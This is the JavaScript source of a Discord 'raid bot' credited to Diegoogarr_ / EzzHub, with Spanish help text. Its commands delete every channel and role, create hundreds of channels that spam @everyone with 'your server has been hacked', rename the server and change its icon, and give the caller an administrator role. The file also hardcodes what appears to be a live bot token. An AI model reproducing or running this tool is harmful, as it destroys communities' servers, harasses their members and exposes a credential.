const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');

client.on("ready", () => {

console.log(chalk.green(`
                                               


        ██████╗░██╗███████╗░██████╗░░█████╗░░█████╗░░██████╗░░█████╗░██████╗░██████╗░
        ██╔══██╗██║██╔════╝██╔════╝░██╔══██╗██╔══██╗██╔════╝░██╔══██╗██╔══██╗██╔══██╗
        ██║░░██║██║█████╗░░██║░░██╗░██║░░██║██║░░██║██║░░██╗░███████║██████╔╝██████╔╝
        ██║░░██║██║██╔══╝░░██║░░╚██╗██║░░██║██║░░██║██║░░╚██╗██╔══██║██╔══██╗██╔══██╗
        ██████╔╝██║███████╗╚██████╔╝╚█████╔╝╚█████╔╝╚██████╔╝██║░░██║██║░░██║██║░░██║
        ╚═════╝░╚═╝╚══════╝░╚═════╝░░╚════╝░░╚════╝░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝                                                                 

`))


console.log(chalk.white(`

                                               ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
                                               │                                                                  │
                                               │          ${chalk.green('• .start')} = Envia el servidor a la mierda                │
                                               │          ${chalk.green('• .nuke')} = Elimina todos los chats del servidor          │
                                               │          ${chalk.green('• .fuck')} = Crea muchos canales con ping en ellos         │
                                               │          ${chalk.green('• .adm')} = Crea un rol con admin y te lo da               │
                                               │                                                                  │
                                               │                                                                  │
                                               │                ===== Usa ${chalk.red('.help')} para más info ====                │
                                               │                                                                  │
                                               ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

                                                                           ${chalk.red(' Creditos:')}
                                                                      ${chalk.red('Diegoogarr_ - EzzHub')}
  `))





   presencia();  
    });



function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "Diegoogarr_ El mas guaperas",
  type: "PLAYING"

}
  });
}


//sistema automatico -----------------------------------------------------x

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === '.start'){
      message.delete()
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`Diegoogarr_`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone discord.gg/eh")
      })
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`raid x Diegogarr_`, {
           type: 'text'
         }).then(channel => {
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
           
           
       })
       }
       message.guild.setName("Hacked by Diegoogarr_");
       message.guild.setIcon("https://media.discordapp.net/attachments/901498733831786526/975844252359733290/unknown.png?width=1208&height=676");
     }
})


//comandos raid -----------------------------------------------------x

client.on("message", async msg => {
  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('.adm')){
    let rol = await msg.guild.roles.create({data: {
      name: "Diegoogarr_",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});




client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '.nuke') {
    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Diegoogarr_`, {
          type: 'text'
        }).then(channel => {
          channel.send("> **Servidor nukeado.**")
        })
         }
      })




client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '.fuck') {
            message.delete()
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`pwned-by-EzzHub`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("#EzzHub")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212")
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
              channel.send("your server has been hacked | @everyone | https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212");
                  
              })
              }
              }
            });




client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('.eliminarroles')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });



client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === '.crearroles') {
                message.delete()
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `Diegoogarr_`,color: '#d41818',},reason: 'razon',})
              };
               }
                });


//comando help -----------------------------------------------------x


client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g );
  const command = args.shift().toLowerCase();
 if (command === '.help') {
     message.delete()
     const embed = new Discord.MessageEmbed()
          .addField('.start', `Nukea todo el servidor, cambia el logo, nombre, chats con mensajes + ping`, true)
          .addField('.nuke', `Elimina todos los canales del servidor`, true)
          .addField('.fuck', `Crea muchos canales con ping`, true)
          .addField('.adm', `Crea un rol con admin y te lo da`, true)
          .addField('.crearroles', `Crea muchos roles en el servidor`, true)
          .addField('.eliminarroles', `Elimina todos los roles del servidor`, true)
          .setDescription(`**Prefix .**  `)
          .setColor(`#090502`)
          .setFooter(`Raid bot by Diegoogarr_`)
          .setAuthor('Comandos:', ' https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212')
          .setImage(`https://media.discordapp.net/attachments/901498733831786526/975848100109385728/unknown.png?width=212&height=212`)
     message.channel.send(embed)
 }
});

client.login("ODU4ODcwNTUzODA3NjgzNjM2.Gy2LBe.edB2eYVnZPNMQSImFqD46sIHiiw63wCHIeM6dc");